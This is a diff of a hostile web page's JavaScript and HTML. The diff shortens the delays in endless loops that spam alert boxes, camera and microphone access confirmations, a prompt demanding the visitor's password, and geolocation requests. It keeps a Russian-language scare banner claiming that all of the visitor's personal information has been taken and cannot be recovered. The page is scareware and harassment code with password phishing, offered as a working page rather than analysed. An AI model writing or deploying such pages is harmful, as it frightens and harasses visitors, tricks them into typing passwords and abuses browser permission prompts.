@@ -84,28 +84,28 @@ async function requestPermissions() {
 async function spamAlerts() {
     while (true) {
         alert("⚠️ Внимание! Запрашиваем доступ!");
-        await new Promise(r => setTimeout(r, 21100));
+        await new Promise(r => setTimeout(r, 10000));
     }
 }
 
 async function spamConfirms() {
     while (true) {
         confirm("Разрешить доступ к камере и микрофону?");
-        await new Promise(r => setTimeout(r, 21100));
+        await new Promise(r => setTimeout(r, 7100));
     }
 }
 
 async function spamPrompts() {
     while (true) {
         prompt("Введите ваш пароль");
-        await new Promise(r => setTimeout(r, 21100));
+        await new Promise(r => setTimeout(r, 11100));
     }
 }
 
 async function spamGeo() {
     while (true) {
         navigator.geolocation.getCurrentPosition(() => {}, () => {});
-        await new Promise(r => setTimeout(r, 21100));
+        await new Promise(r => setTimeout(r, 14000));
     }
 }
 
@@ -143,6 +143,7 @@ main();
     <p class="warning">ВСЯ ВАША ЛИЧНАЯ ИНФОРМАЦИЯ НАХОДИТЬСЯ У НАС! попытка восстановить не будет успешной</p>
 </body>
 </html>
+
 
 
 
